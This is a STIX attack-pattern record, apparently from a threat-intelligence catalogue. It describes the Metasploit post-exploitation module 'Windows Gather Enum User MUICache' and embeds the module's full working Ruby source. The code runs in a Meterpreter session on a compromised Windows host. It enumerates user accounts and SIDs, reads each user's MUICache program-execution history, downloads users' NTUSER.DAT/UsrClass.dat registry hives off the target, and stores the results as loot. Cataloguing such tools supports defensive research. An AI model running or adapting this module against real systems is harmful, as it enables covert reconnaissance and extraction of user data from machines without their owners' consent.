{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--42a9c5c3-384a-4b76-a443-92a8faa3fbaf",
    "created": "2024-08-14T16:33:05.035167Z",
    "modified": "2024-08-14T16:33:05.035171Z",
    "name": "Windows Gather Enum User MUICache",
    "description": " This module gathers information about the files and file paths that logged on users have executed on the system. It also will check if the file still exists on the system. This information is gathered by using information stored under the MUICache registry key. If the user is logged in when the module is executed it will collect the MUICache entries by accessing the registry directly. If the user is not logged in the module will download users registry hive NTUSER.DAT/UsrClass.dat from the system and the MUICache contents are parsed from the downloaded hive.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_muicache.rb",
            "external_id": "enum_muicache.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/registry'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Enum User MUICache',\n        'Description' => %q{\n          This module gathers information about the files and file paths that logged on users have\n          executed on the system. It also will check if the file still exists on the system. This\n          information is gathered by using information stored under the MUICache registry key. If\n          the user is logged in when the module is executed it will collect the MUICache entries\n          by accessing the registry directly. If the user is not logged in the module will download\n          users registry hive NTUSER.DAT/UsrClass.dat from the system and the MUICache contents are\n          parsed from the downloaded hive.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['TJ Glad <tjglad[at]cmail.nu>'],\n        'Platform' => ['win'],\n        'SessionType' => ['meterpreter'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_close\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              stdapi_fs_stat\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  # Scrapes usernames, sids and homepaths from the registry so that we'll know\n  # what user accounts are on the system and where we can find those users\n  # registry hives.\n  def find_user_names\n    user_names = []\n    user_homedir_paths = []\n    user_sids = []\n\n    username_reg_path = \"HKLM\\\\Software\\\\Microsoft\\\\Windows\\ NT\\\\CurrentVersion\\\\ProfileList\"\n    profile_subkeys = registry_enumkeys(username_reg_path)\n    if profile_subkeys.blank?\n      print_error('Unable to access ProfileList registry key. Unable to continue.')\n      return nil\n    end\n\n    profile_subkeys.each do |user_sid|\n      unless user_sid.length > 10\n        next\n      end\n\n      user_home_path = registry_getvaldata(\"#{username_reg_path}\\\\#{user_sid}\", 'ProfileImagePath')\n      if user_home_path.blank?\n        print_error('Unable to read ProfileImagePath from the registry. Unable to continue.')\n        return nil\n      end\n      full_path = user_home_path.strip\n      user_names << full_path.split('\\\\').last\n      user_homedir_paths << full_path\n      user_sids << user_sid\n    end\n\n    return user_names, user_homedir_paths, user_sids\n  end\n\n  # This function builds full registry muicache paths so that we can\n  # later enumerate the muicahe registry key contents.\n  def enum_muicache_paths(sys_sids, mui_path)\n    user_mui_paths = []\n    hive = 'HKU\\\\'\n\n    sys_sids.each do |sid|\n      full_path = hive + sid + mui_path\n      user_mui_paths << full_path\n    end\n\n    user_mui_paths\n  end\n\n  # This is the main enumeration function that calls other main\n  # functions depending if we can access the registry directly or if\n  # we need to download the hive and process it locally.\n  def enumerate_muicache(muicache_reg_keys, sys_users, sys_paths, muicache, hive_file)\n    results = []\n\n    all_user_entries = sys_users.zip(muicache_reg_keys, sys_paths)\n\n    all_user_entries.each do |user, reg_key, sys_path|\n      subkeys = registry_enumvals(reg_key)\n      if subkeys.blank?\n        # If the registry_enumvals returns us nothing then we'll know\n        # that the user is most likely not logged in and we'll need to\n        # download and process users hive locally.\n        print_warning(\"User #{user}: Can't access registry. Maybe the user is not logged in? Trying NTUSER.DAT/USRCLASS.DAT...\")\n        result = process_hive(sys_path, user, muicache, hive_file)\n        unless result.nil?\n          result.each do |r|\n            results << r unless r.nil?\n          end\n        end\n      else\n        # If the registry_enumvals returns us content we'll know that we\n        # can access the registry directly and thus continue to process\n        # the content collected from there.\n        print_status(\"User #{user}: Enumerating registry...\")\n        subkeys.each do |key|\n          if key[0] != '@' && key != 'LangID' && !key.nil?\n            result = check_file_exists(key, user)\n            results << result unless result.nil?\n          end\n        end\n      end\n    end\n\n    results\n  end\n\n  # This function will check if it can find the program executable\n  # from the path it found from the registry. Permissions might affect\n  # if it detects the executable but it should be otherwise fairly\n  # reliable.\n  def check_file_exists(key, user)\n    program_path = expand_path(key)\n    if file_exist?(key)\n      return [user, program_path, 'File found']\n    else\n      return [user, program_path, 'File not found']\n    end\n  end\n\n  # This function will check if the filepath contains a registry hive\n  # and if it does it'll proceed to call the function responsible of\n  # downloading the hive. After successfull download it'll continue to\n  # call the hive_parser function which will extract the contents of\n  # the MUICache registry key.\n  def process_hive(sys_path, user, muicache, hive_file)\n    user_home_path = expand_path(sys_path)\n    hive_path = user_home_path + hive_file\n    ntuser_status = file_exist?(hive_path)\n\n    unless ntuser_status == true\n      print_warning(\"Couldn't locate/download #{user}'s registry hive. Unable to proceed.\")\n      return nil\n    end\n\n    print_status(\"Downloading #{user}'s NTUSER.DAT/USRCLASS.DAT file...\")\n    local_hive_copy = Rex::Quickfile.new('jtrtmp')\n    local_hive_copy.close\n    begin\n      session.fs.file.download_file(local_hive_copy.path, hive_path)\n    rescue ::Rex::Post::Meterpreter::RequestError\n      print_error('Unable to download NTUSER.DAT/USRCLASS.DAT file')\n      begin\n        local_hive_copy.unlink\n      rescue StandardError\n        nil\n      end\n      return nil\n    end\n    results = hive_parser(local_hive_copy.path, muicache, user)\n    begin\n      local_hive_copy.unlink\n    rescue StandardError\n      nil\n    end\n\n    results\n  end\n\n  # This function is responsible for parsing the downloaded hive and\n  # extracting the contents of the MUICache registry key.\n  def hive_parser(local_hive_copy, muicache, user)\n    results = []\n    print_status('Parsing registry content...')\n    err_msg = 'Error parsing hive. Unable to continue.'\n    hive = Rex::Registry::Hive.new(local_hive_copy)\n    if hive.nil?\n      print_error(err_msg)\n      return nil\n    end\n\n    muicache_key = hive.relative_query(muicache)\n    if muicache_key.nil?\n      print_error(err_msg)\n      return nil\n    end\n\n    muicache_key_value_list = muicache_key.value_list\n    if muicache_key_value_list.nil?\n      print_error(err_msg)\n      return nil\n    end\n\n    muicache_key_values = muicache_key_value_list.values\n    if muicache_key_values.nil?\n      print_error(err_msg)\n      return nil\n    end\n\n    muicache_key_values.each do |value|\n      key = value.name\n      if key[0] != '@' && key != 'LangID' && !key.nil?\n        result = check_file_exists(key, user)\n        results << result unless result.nil?\n      end\n    end\n\n    results\n  end\n\n  # Information about the MUICache registry key was collected from:\n  #\n  # - Windows Forensic Analysis Toolkit / 2012 / Harlan Carvey\n  # - Windows Registry Forensics / 2011 / Harlan Carvey\n  # - http://forensicartifacts.com/2010/08/registry-muicache/\n  # - http://www.irongeek.com/i.php?page=security/windows-forensics-registry-and-file-system-spots\n  def run\n    print_status('Starting to enumerate MUICache registry keys...')\n    version = get_version_info\n\n    if version.xp_or_2003? && is_admin?\n      print_good(\"Remote system supported: #{version.product_name}\")\n      muicache = '\\\\Software\\\\Microsoft\\\\Windows\\\\ShellNoRoam\\\\MUICache'\n      hive_file = '\\\\NTUSER.DAT'\n    elsif version.build_number >= Msf::WindowsVersion::Vista_SP0 && is_admin?\n      print_good(\"Remote system supported: #{version.product_name}\")\n      muicache = \"_Classes\\\\Local\\ Settings\\\\Software\\\\Microsoft\\\\Windows\\\\Shell\\\\MUICache\"\n      hive_file = '\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\UsrClass.dat'\n    else\n      print_error('Unsupported OS or not enough privileges. Unable to continue.')\n      return nil\n    end\n\n    table = Rex::Text::Table.new(\n      'Header' => 'MUICache Information',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'Username',\n        'File path',\n        'File status',\n      ]\n    )\n\n    print_status('Phase 1: Searching user names...')\n    sys_users, sys_paths, sys_sids = find_user_names\n\n    if sys_users.blank?\n      print_error('Was not able to find any user accounts. Unable to continue.')\n      return nil\n    else\n      print_good(\"Users found: #{sys_users.join(', ')}\")\n    end\n\n    print_status('Phase 2: Searching registry hives...')\n    muicache_reg_keys = enum_muicache_paths(sys_sids, muicache)\n    results = enumerate_muicache(muicache_reg_keys, sys_users, sys_paths, muicache, hive_file)\n\n    results.each { |r| table << r }\n\n    print_status('Phase 3: Processing results...')\n    loot = store_loot('muicache_info', 'text/plain', session, table.to_s, nil, 'MUICache Information')\n    print_line(\"\\n\" + table.to_s + \"\\n\")\n    print_good(\"Results stored as: #{loot}\")\n    print_status('Execution finished.')\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}